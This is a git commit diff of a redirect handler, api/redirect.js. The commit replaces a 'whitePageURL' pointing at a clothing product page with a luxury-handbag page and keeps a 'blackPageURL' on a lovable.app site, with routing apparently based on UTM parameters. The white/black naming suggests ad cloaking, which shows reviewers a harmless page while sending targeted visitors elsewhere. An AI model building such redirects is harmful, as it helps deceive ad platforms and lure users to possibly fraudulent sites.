0a5ede22e98998d7ff64f1b5cae1c8ecbcaf04f8
Ahmadfarhan67 <123234895+Ahmadfarhan67@users.noreply.github.com>
2025-11-12 23:01:27 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://ajeworld.com.au/collections/aje-denim/products/electra-logo-denim-short-mid-indigo-wash";
+    const whitePageURL = "https://luxeitfwd.com.au/louis-vuitton-montaigne-gm-monogram-empreinte-10112025.html";
     const blackPageURL = "https://casssshlov.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
